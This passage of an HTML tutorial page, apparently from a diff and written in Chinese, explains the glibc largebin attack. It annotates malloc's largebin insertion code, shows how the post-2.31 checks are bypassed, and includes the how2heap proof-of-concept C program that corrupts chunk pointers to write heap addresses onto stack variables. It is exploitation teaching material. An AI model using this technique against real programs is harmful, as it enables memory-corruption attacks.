+</span></span><span class="line"><span class="cl">                <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">bck</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> 
+</span></span><span class="line"><span class="cl">        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mark_bin</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="err">&#39;&#39;&#39;这里通上</span> <span class="err">，提前构造</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="err">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="插入chunk比最小的大">插入chunk比最小的大
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"> <span class="k">while</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">assert</span><span class="p">((</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&amp;</span> <span class="n">NON_MAIN_ARENA</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">size</span> <span class="o">==</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="k">else</span> 
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="err">&#39;&#39;&#39;如果</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize被提前构造那victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize会被改</span><span class="err">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1">//fwd此时指向第一个比victim小的chunk
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此时fwd指向比victim小的最大chunk,我们提前修改fwd的bk_nextsize的话</p>
+<p>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;就可以向fwd-&gt;bk_next_size+0x20中写一个victim地址(heap地址)，这种情况只有<strong>在2.31之前</strong>有效</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"> <span class="n">bck</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> 
+</span></span><span class="line"><span class="cl">        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mark_bin</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="err">&#39;&#39;&#39;这里通上</span> <span class="err">，提前构造</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="err">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里控制fwd-&gt;bk（bck）,则bck-&gt;fd = victim;将bck+0x10处改为victim地址</p>
+<h3 id="插入chunk比最小chunk还小">插入chunk比最小chunk还小
+</h3><p>从2.31开始引入了两个检查</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// line 3867
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;malloc(): largebin double linked list corrupted (nextsize)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// line 3872
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">bck</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是如果插入chunk比最小的largebin_chunk还小会直接被链入，没有这些检查</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="err">第一种情况，比最小的小</span>
+</span></span><span class="line"><span class="cl">                <span class="err">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">bck</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这时fwd-&gt;fd是largebin的最大chunk，我们控制fwd-&gt;fd-&gt;bk_nextsize为addr,则victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; 把victim-&gt;bk_nextsize赋值为addr,</p>
+<p>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;将addr+0x18改为victim地址</p>
+<h2 id="how2heap-demo">how2heap demo
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_var1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_var2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;stack_var1 (%p): %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var1</span><span class="p">,</span> <span class="n">stack_var1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;stack_var2 (%p): %ld</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var2</span><span class="p">,</span> <span class="n">stack_var2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p1</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x320</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p2</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p3</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="n">p4</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">free</span><span class="p">(</span><span class="n">p3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p2</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3f1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">stack_var1</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">p2</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">stack_var2</span> <span class="o">-</span> <span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;stack_var1 (%p): %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var1</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">stack_var1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;stack_var2 (%p): %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var2</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">stack_var2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行到23行后，有两个空闲chunk在unsortedbin</p>
+<p><img src="/image/Largebin/1.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="1"
+	
+	
+></p>
+<p>然后malloc(0x90)，先扫描p1，p2将他们分别放进smallbin和largebin，然后分割smallbin的p1，并把分割后的chunk(0x330-0xa0)放回unsortedbin</p>
+<p>接下来free(p3)又free了一个0x410的chunk</p>
+<p>然后修改了largebin里的p2，把size改成0x3f1，既属于largebin，又小于p3  size</p>
+<p><img src="/image/Largebin/2.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="2"
+	
+	
+></p>
+<p>接下来一个malloc(0x90)会将p3插入largebin，触发</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-basic" data-lang="basic"><span class="line"><span class="cl"><span class="vg">while</span><span class="w"> </span><span class="p">((</span><span class="vg">unsigned</span><span class="w"> </span><span class="vg">long</span><span class="p">)</span><span class="w"> </span><span class="vg">size</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="vg">fwd</span><span class="o">-&gt;</span><span class="vg">size</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="w">              </span><span class="vg">fwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">fwd</span><span class="o">-&gt;</span><span class="vg">fd_nextsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="w">              </span><span class="vg">assert</span><span class="p">((</span><span class="vg">fwd</span><span class="o">-&gt;</span><span class="vg">size</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="vg">NON_MAIN_ARENA</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="il">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="w">          </span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="w">          </span><span class="vg">if</span><span class="w"> </span><span class="p">((</span><span class="vg">unsigned</span><span class="w"> </span><span class="vg">long</span><span class="p">)</span><span class="w"> </span><span class="vg">size</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="vg">unsigned</span><span class="w"> </span><span class="vg">long</span><span class="p">)</span><span class="w"> </span><span class="vg">fwd</span><span class="o">-&gt;</span><span class="vg">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="w">              </span><span class="vg">fwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">fwd</span><span class="o">-&gt;</span><span class="vg">fd</span><span class="p">;</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="vg">else</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="w">              </span><span class="c1">&#39;&#39;&#39;如果fwd-&gt;bk_nextsize被提前构造那victim-&gt;bk_nextsize会被改&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="w">              </span><span class="vg">victim</span><span class="o">-&gt;</span><span class="vg">fd_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">fwd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="w">              </span><span class="vg">victim</span><span class="o">-&gt;</span><span class="vg">bk_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">fwd</span><span class="o">-&gt;</span><span class="vg">bk_nextsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="w">              </span><span class="vg">fwd</span><span class="o">-&gt;</span><span class="vg">bk_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="w">              </span><span class="vg">victim</span><span class="o">-&gt;</span><span class="vg">bk_nextsize</span><span class="o">-&gt;</span><span class="vg">fd_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="w">          </span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个代码,此时victim相当于p3,fwd相当于p2，p3的bk_nextsize被修改成我们构造的addr2，*(addr2+4)被改成p3地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-basic" data-lang="basic"><span class="line"><span class="cl"><span class="w">          </span><span class="vg">bck</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">fwd</span><span class="o">-&gt;</span><span class="vg">bk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="vg">else</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="vg">victim</span><span class="o">-&gt;</span><span class="vg">fd_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">victim</span><span class="o">-&gt;</span><span class="vg">bk_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="vg">mark_bin</span><span class="p">(</span><span class="vg">av</span><span class="p">,</span><span class="w"> </span><span class="vg">victim_index</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">&#39;&#39;&#39;这里通上 ，提前构造fwd-&gt;bk&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="vg">victim</span><span class="o">-&gt;</span><span class="vg">bk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">bck</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="vg">victim</span><span class="o">-&gt;</span><span class="vg">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">fwd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="vg">fwd</span><span class="o">-&gt;</span><span class="vg">bk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="vg">bck</span><span class="o">-&gt;</span><span class="vg">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="w"> </span><span class="vg">等价于</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="vg">fwd</span><span class="o">-&gt;</span><span class="vg">bk</span><span class="p">)</span><span class="o">-&gt;</span><span class="vg">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="w"> </span><span class="vg">等价于</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="p">(</span><span class="vg">addr1</span><span class="o">+</span><span class="il">2</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="vg">victim</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>p3的bk被改为addr1,*(addr1+2)被改为p2地址</p>
+<p>利用条件</p>
+<ul>
+<li>可以修改一个 large bin chunk 的 data</li>
+<li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li>
+</ul>
+
+</section>
